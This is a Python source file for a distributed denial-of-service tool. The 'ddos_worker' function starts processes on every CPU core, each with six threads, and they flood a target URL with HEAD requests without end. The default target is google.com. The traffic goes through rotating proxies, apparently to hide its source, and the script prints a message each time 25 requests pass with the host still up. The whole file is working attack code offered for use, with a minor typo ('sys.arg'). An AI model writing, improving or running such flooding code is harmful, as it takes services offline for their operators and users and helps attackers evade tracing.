import requests
import sys
from multiprocessing import Process,Queue,cpu_count
from concurrent.futures import ThreadPoolExecutor, as_completed
from proxy_manager import ProxyManager

MAX_THREADS = 6
def spin_threads(target_ip, port, proxy_queue, abort_queue):
    print('spinning threads')
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            tasks = [
                executor.submit(
                    ddos_worker,
                    *(target_ip, port, proxy_queue)
                ) for i in range(MAX_THREADS)
            ]
            for task in as_completed(tasks):
                times = task.result()
                print(times)
            try:
                e = abort_queue.get_nowait()
                print('aborting')
                return
            except:
                pass

def ddos_worker(target_ip, port, proxy_queue):
    times = []
    while 1:
        proxy = proxy_queue.get()
        try:
            response = requests.head(target_ip+':'+str(port), proxies = {"https":proxy})
            if response.status_code == 200:
                #print(response.elapsed)
                times.append(response.elapsed)
            else:
                print("did not return 200 OK")
                times.append(-1)

        except KeyboardInterrupt:
            raise KeyboardInterrupt
        except requests.exceptions.ProxyError:
            pass
        except requests.exceptions.SSLError:
            pass
        except requests.exceptions.ConnectTimeout:
            pass
        except Exception as e:
            print(e)
            continue
        
        if(len(times)%25 == 0): print('made 25 requests, host still up')

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) - 1 > 0 else 'https://www.google.com'
    port =  sys.arg[2] if len(sys.argv) - 1  > 1 else 443

    proxy_queue = Queue()
    abort_q = Queue()

    

    pman = ProxyManager()
    print('filling proxy stack')
    pman.fill_proxy_stack()
    while not pman.proxy_stack:
        pass
    
    num_processes = cpu_count()
    processes = []
    print('spinning processes')
    for i in range(num_processes):
        processes.append(Process(target=spin_threads, args=(target, port, proxy_queue, abort_q)))
        processes[i].start()
    
    try:
        while True:
            if proxy_queue.qsize() < 4:
                proxy_queue.put(pman.request_new_proxy())
    except KeyboardInterrupt:
        print('exiting')
        for i in range(len(processes)): abort_q.put('exit')
        for p in processes:
            p.join()
        exit()

        
